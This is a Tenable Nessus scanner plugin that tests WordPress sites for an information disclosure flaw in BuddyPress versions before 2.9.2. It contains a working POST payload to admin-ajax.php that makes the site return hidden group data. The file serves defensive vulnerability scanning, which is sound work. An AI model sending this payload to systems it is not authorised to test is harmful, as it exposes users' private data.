#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(105358);
  script_version("1.6");
  script_cvs_date("Date: 2018/11/15 20:50:19");


  script_name(english:"BuddyPress Plugin for WordPress < 2.9.2 Information Disclosure");
  script_summary(english:"Checks for information disclosure.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is running a PHP application that is affected
by an information disclosure vulnerability");

  script_set_attribute(attribute:"description", value:
"The BuddyPress Plugin for WordPress running on the remote web server
is prior to version 2.9.2. It is, therefore, affected by an
information disclosure vulnerability. A remote, unauthenticated
attacker can exploit this vulnerability, via a specially crafted
request, to display private administrative group information."
  );
  script_set_attribute(attribute:"see_also", value:"https://wordpress.org/plugins/buddypress/");
  script_set_attribute(attribute:"see_also", value:"https://hackerone.com/reports/282176");
  script_set_attribute(attribute:"solution", value:
"Upgrade the BuddyPress Plugin for WordPress to version
2.9.2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:U/RL:O/RC:C");


  script_set_attribute(attribute:"vuln_publication_date", value:"2017/10/23");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/10/27");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/12/18");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2017-2018 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");
include("misc_func.inc");
include("data_protection.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);
plugin_url = install_url + "wp-content/plugins/buddypress/";
vuln_url = dir + "/wp-admin/admin-ajax.php";

plugin = 'BuddyPress';

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

# if not found as installed from kb, check for regex in plugin dir
# We look for this file rather than admin-ajax.php as the latter will always exist.
if (!installed)
{
  # Check for the following string in the url indicated below
  regexes[0] = make_list("buddypress", "wordpress");
  checks["/wp-content/plugins/buddypress/composer.json"] = regexes;

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}

if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

# Payload to be send as post data 
payload = 'action=groups_filter&cookie=bp-groups-filter%253D%252526show_hidden%3D1&object=groups';

# Exploit vulnerability
res = http_send_recv3(
  method : "POST",
  port   : port,
  data   : payload,
  item   : vuln_url,
  add_headers : make_array("Content-Type",
                         "application/x-www-form-urlencoded",
                         "Content-Length",
                         strlen(payload)),
  exit_on_fail : TRUE
);

# Save response data to parse for Indicators of Compromise
body = res[2];

# These are our indicators that hidden data has been returned
pat = '(<li class="(even|odd) hidden group-has-avatar">(?s:.)+a>)';
match = pregmatch(pattern:pat, string:body);

exploitRequest = http_last_sent_request();

if (!empty_or_null(match))
{
  output = match[0];
  security_report_v4(
    port        : port,
    severity    : SECURITY_WARNING,
    request     : make_list(exploitRequest),
    output      : data_protection::sanitize_user_full_redaction(output:chomp(output)),
    generic     : TRUE
  );
}
else audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + ' plugin');
